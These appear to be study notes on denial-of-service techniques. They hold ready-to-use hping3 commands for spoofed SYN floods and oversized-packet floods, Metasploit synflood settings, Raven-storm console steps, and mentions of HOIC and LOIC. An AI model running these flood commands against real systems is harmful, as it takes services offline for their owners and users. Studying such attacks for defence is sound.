• UDP flood attack

	
• ICMP flood attack
• Ping of Death and smurf attack
• Pulse wave and zero-day attack

	1.  DoS and DDoS  Techniques
		○ Metasploit
			§ Payload to use "synflood"
			§ Set the following 
				□ RHOST
				□ SHOST(Spoofed)
				□ RPORT
			§ In this case, only the IP of the source packet is spoofed, however the MAC still shows up as the attackers system within the frame.
				
		○  hping3
			§ SYN ATTACK- 
				$hping3 -S <target IP> -a <spoofed IP> -p <port> --flood
				-S	SYN 
				--flood	Flood
				-a 	Spoof add
			§ PoD Attack- attacker tries to crash syst by sending bad packets
				$hping3 -d 65538 -S -p 21 --flood <IP>
			§ UDP layer flood
				□ -2
        
		○  Raven-storm
			§ Layer3,4,7 attack
			$sudo rst
				>l4
				>ip <ip>
				>port <80>
				>threads <#>
				>run
		○  HOIC
			§ DOS attack with HTTP(GET and POST) protocols
      
		○ g LOIC
			§ DOS attack with TCP/UDP/HTTP(GET-only Floods)
